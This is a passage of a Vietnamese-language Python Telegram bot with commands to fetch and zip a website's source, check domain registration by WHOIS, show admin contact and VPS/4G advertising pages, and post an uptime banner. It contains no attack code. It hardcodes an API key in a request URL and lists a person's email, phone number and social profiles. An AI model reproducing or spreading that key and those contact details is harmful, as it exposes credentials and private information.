            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL !\n@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP !')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(
            message.chat.id, 
            zip_file, 
            caption=f"Dưới đây là mã nguồn bạn yêu cầu.:> @{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
        )

    except requests.exceptions.RequestException as e:
        error_message = str(e)
        if "NameResolutionError" in error_message:
            bot.reply_to(message, 'Link Wep Đâu Rồi Cu:>@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        else:
            bot.reply_to(message, f'Có lỗi xảy ra: {error_message}@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')






@bot.message_handler(commands=['kiemtra'])
def check_domain(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Lấy tên người gửi
    user_username = message.from_user.username if message.from_user.username else message.from_user.first_name
    
    # Lấy tên miền từ tin nhắn
    domain = message.text.replace("/kiemtra", "").strip()
    
    # Kiểm tra xem đã cung cấp tên miền chưa
    if not domain:
        bot.reply_to(message, f"Vui lòng nhập tên miền, @{user_username}!\nVí dụ: /kiemtra example.com\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        return
    
    # Kiểm tra và chuẩn hóa URL
    parsed_url = urlparse(domain)
    if not parsed_url.scheme:
        domain = 'http://' + domain
        parsed_url = urlparse(domain)
    
    # Kiểm tra URL có hợp lệ không
    if not parsed_url.netloc:
        bot.reply_to(message, f"URL không hợp lệ, @{user_username}. Vui lòng kiểm tra lại!\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        return

    # Thực hiện truy vấn WHOIS
    try:
        w = whois.whois(parsed_url.netloc)
        if w.domain_name:
            bot.reply_to(message, f"Tên miền {parsed_url.netloc} đã được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        else:
            bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
    except whois.parser.PywhoisError:
        bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
    except socket.gaierror:
        bot.reply_to(message, f"Có lỗi xảy ra khi kết nối đến máy chủ WHOIS, @{user_username}. Vui lòng thử lại sau.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra, @{user_username}: {str(e)}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")



@bot.message_handler(commands=['admin1'])
def admin_info(message):
    video_url = "https://files.catbox.moe/bdcwme.mp4"  # Thay thế bằng URL thực tế của video
    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
    fb2_box = "https://httpsvpsvanmanhgaming.click"
    shop_4g = "https://4gvpsvanmanhgaming.click"
    tiktok2_url = "https://www.tiktok.com/@sadboyum3107"
    youtube3_url = "https://www.youtube.com/@kenhkokinang"
    youtube2_url = "https://www.youtube.com/@EDMremixTikTok"
    web2_url = "https://www.facebook.com/profile.php?id=100089057461799"
    tle5_url = "https://t.me/Vpsvanmanhgaming"

    admin1_message = (
        "<b>🌟 Thông Tin Liên Hệ Của Admin1 🌟</b>\n\n"
        f"<b>🔹 Facebook:</b> <a href='{web2_url}'>Xem Hồ Sơ</a>\n"
        f"<b>🔹 Cho Thuê VPS Giá Rẻ:</b> <a href='{fb2_box}'>Xem Chi Tiết</a>\n"
        f"<b>🔹 Shop 4G💳💲:</b> <a href='{shop_4g}'>Mua Ngay</a>\n"
        f"<b>🔹 Tiktok:</b> <a href='{tiktok2_url}'>Xem Video</a>\n"
        f"<b>🔹 Youtube Chính:</b> <a href='{youtube3_url}'>Theo Dõi</a>\n"
        f"<b>🔹 Youtube Phụ:</b> <a href='{youtube2_url}'>Theo Dõi</a>\n"
        f"<b>🔹 Telegram Chủ Bot:</b> <a href='{tle5_url}'>Liên Hệ</a>"
        f"<b>🔹 Link Vào Nhóm:</b> <a href='https://t.me/botvipvc'>Tham Gia</a>\n"
        f"<b>🔹 Lưu Ý:</b> BOT Chỉ Hoạt Động Trong Nhóm!\n"
    )
    help_text = (
        "<b>🔹 Liên Hệ Chủ Bot:</b> <a href='https://t.me/@Vpsvanmanhgaming'>Nhắn Tin</a>\n"
        "<b>📞 Số Điện Thoại Zalo Để Thuê:</b> 0559140928\n"
        "<b>🔗 Link Facebook Để Thuê:</b> <a href='https://www.facebook.com/profile.php?id=100089057461799'>Xem Hồ Sơ</a>\n"
        "<b>📱 Link TikTok Để Thuê:</b> <a href='https://www.tiktok.com/@kecodon7103'>Xem Video</a>\n"
        "<b>🔗 LINK TLE ĐỂ THUÊ:</b> <a href='https://t.me/Vpsvanmanhgaming'>Liên Hệ</a>\n"
        "<b>🌟 NHÓM TLE GIAO LƯU:</b> <a href='https://t.me/botvipvc'>Tham Gia</a>\n"
        "<b>🌟 NHÓM TLE GIAO LƯU KHÁC:</b> <a href='https://t.me/botvipfc'>Tham Gia</a>\n"
        "<b>🚀 Admin Cung Cấp Dịch Vụ 4G, 5G VPN Giá Rẻ Nhất 😎✨</b>\n"
        "<b>🔹 Website VPN:</b> <a href='https://4gvpsvanmanhgaming.click'>Xem Ngay</a>\n"
        "<b>🔸 Rẻ Nhất Chỉ Từ 7k 💸</b> - Tốc Độ Cực Mạnh, Nhiều GB ⚡\n"
        "<b>🔸 Rất Nhiều Cổng Mạng, File, Server 🌍</b>\n"
        "<b>🔸 Cung Cấp Dịch Vụ 4G Tốc Độ Cực Cao 📶💨</b>\n"
        "<b>🔸 Dịch Vụ VPN Tăng Tốc Mạng, Wifi 🔧🌐</b>\n"
        "<b>🔸 Hệ Thống Máy Chủ Cao Cấp 🖥️🔒</b>\n"
        "<b>🔸 'Ngon - Bổ - Rẻ' 😋💯</b>\n"
        "<b>🔸 Làm CTV Web Con 40% 💼📈</b>\n"
        "<b>🔸 Trải Nghiệm Mượt Mà Nhất 🎬🎮🖥️</b>\n"
        "<b>👉 Copyright 2024 © Powered By <a href='https://4gvpsvanmanhgaming.click'>4GVPS</a> 👈</b>"
    )
    bot.reply_to(message, admin1_message, parse_mode='HTML')
    bot.reply_to(message, help_text, parse_mode='HTML')
    bot.send_video(message.chat.id, video_url, caption="<b>🎥 Video Giới Thiệu Dịch Vụ 4G Giá Rẻ Nha:</b>", parse_mode='HTML')

















@bot.message_handler(commands=['admin2'])
def admin_info(message):
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, f'>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : <a href="https://t.me/botvipvc">https://t.me/botvipvc</a>', parse_mode='HTML')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, f'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : <a href="https://t.me/botvipvc">https://t.me/botvipvc</a>', parse_mode='HTML')
        return

    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
    admin2_message = (f'''
📄 Admin Information2\n\n
<b>Telegram</b>: @Selphy_ExE\n
<b>Facebook</b>: Vu Hai Lam\n
<b>Email</b>: lamvuhai26@gmail.com\n
<b>Instagram</b>: Chỉ Cần Bạn Vui\n
<b>Website</b>: <code>PandaNetwork.Click</code>\n
<b>Website2</b>: <code>Api.PandaNetwork.Click</code>\n
<b>🩷 Admin Gửi Đôi Lời:</b> <i>Anh yêu em như củ khoai nang mà em lại đi theo thằng lang thang</i>\n



        ''')

    bot.reply_to(message, admin2_message, parse_mode='HTML')






def get_elapsed_time():
    elapsed_time = time.time() - start_time
    return str(timedelta(seconds=int(elapsed_time)))

def get_banner_image(elapsed_time):
    random_number = random.randint(1, 45)
    url = f"https://nguyenmanh.name.vn/api/avtWibu6?id={20}&tenchinh=TIME%20BOT&tenphu={elapsed_time}&mxh= &apikey=BaAMAS2s"
    response = requests.get(url)
    return BytesIO(response.content)

@bot.message_handler(commands=['time'])
def send_time(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    user_id = message.from_user.id
    if user_id not in ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        return

    elapsed_time = get_elapsed_time()
    banner_image = get_banner_image(elapsed_time)
    
    bot.send_photo(
        message.chat.id,
        banner_image,
        caption=f"[❄️]~~~>TIME<~~~[❄️]\nBot đã hoạt động được[{20}]\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
    )







@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /start để xem danh sách lệnh !\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)

